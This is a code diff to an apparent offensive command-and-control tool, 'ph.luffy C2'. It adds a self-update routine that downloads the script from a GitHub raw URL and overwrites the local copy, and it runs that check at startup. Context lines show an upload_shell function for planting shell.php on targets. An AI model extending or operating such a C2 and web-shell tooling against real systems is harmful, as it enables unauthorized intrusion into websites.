@@ -10,8 +10,47 @@ RESET = "\033[0m"
 SESSION_FILE = "controller_sessions.json"
 
 TOOL_NAME = "ph.luffy C2"
-TOOL_VERSION = "v1.0"
+TOOL_VERSION = "1.0"
 TOOL_AUTHOR = "Coded by ph.luffy"
+
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/kaitolegion/c2/main/c2.py"
+
+def check_for_update():
+    try:
+        r = requests.get(GITHUB_RAW_URL, timeout=5)
+        if r.status_code == 200:
+            remote_code = r.text
+            # Extract remote version string
+            for line in remote_code.splitlines():
+                if "TOOL_VERSION" in line and "=" in line:
+                    remote_version = line.split("=")[1].strip().strip('"\'')
+                    break
+            else:
+                print(f"{YELLOW}[!]{RESET} Could not find version info in remote file.")
+                return
+
+            if remote_version != TOOL_VERSION:
+                print(f"{YELLOW}[!]{RESET} Update available: {GREEN}{remote_version}{RESET} (current: {TOOL_VERSION})")
+                choice = input(f"{BLUE}[?]{RESET} Do you want to update now? [Y/n]: ").strip().lower()
+                if choice in ["y", "yes", ""]:
+                    apply_update(r.text)
+                else:
+                    print(f"{YELLOW}[!]{RESET} Skipping update.")
+        else:
+            print(f"{YELLOW}[!]{RESET} Failed to check for updates (HTTP {r.status_code})")
+    except Exception as e:
+        print(f"{YELLOW}[!]{RESET} Update check failed: {e}")
+
+
+def apply_update(new_code):
+    try:
+        with open("c2.py", "w", encoding="utf-8") as f:
+            f.write(new_code)
+        print(f"{GREEN}[+]{RESET} Update complete!")
+        print(f"{BLUE}[*]{RESET} Please restart the tool.")
+        exit()
+    except Exception as e:
+        print(f"{YELLOW}[!]{RESET} Update failed: {e}")
 
 def banner():
     print(f"""{SILVER}
@@ -114,6 +153,10 @@ def upload_shell(session, shell_name="shell.php"):
         print(f"{YELLOW}[!]{RESET} Upload error: {e}")
 
 # -------- MAIN --------
+
+# check first if there is update
+check_for_update()
+
 sessions = load_sessions()
 
 if sessions:
